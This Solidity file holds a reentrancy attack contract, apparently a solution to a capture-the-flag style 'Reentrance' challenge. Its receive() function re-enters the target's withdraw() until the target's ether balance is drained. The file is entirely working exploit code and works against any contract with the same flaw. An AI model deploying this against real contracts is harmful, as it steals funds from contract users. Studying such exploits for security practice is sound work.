pragma solidity ^0.8.0;
import {Script, console2} from "forge-std/Script.sol";
interface Reentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
    function balanceOf(address _who) external view returns (uint);
}
contract ReentranceAttacker {
  address public target;

  constructor(address _target) payable {
    target = _target;
  }

  function attack() public {
    Reentrance(target).donate{value: address(this).balance}(address(this));
    uint256 withdrawBalance = calculateWithdrawBalance();
    Reentrance(target).withdraw(withdrawBalance);
  }

  receive() external payable {
    if (target.balance > 0) {
      attack();
    }
  }

  function calculateWithdrawBalance() internal view returns (uint256) {
    uint256 remainingBalance = Reentrance(target).balanceOf(address(this));
    return remainingBalance > target.balance ? target.balance : remainingBalance;
  }
}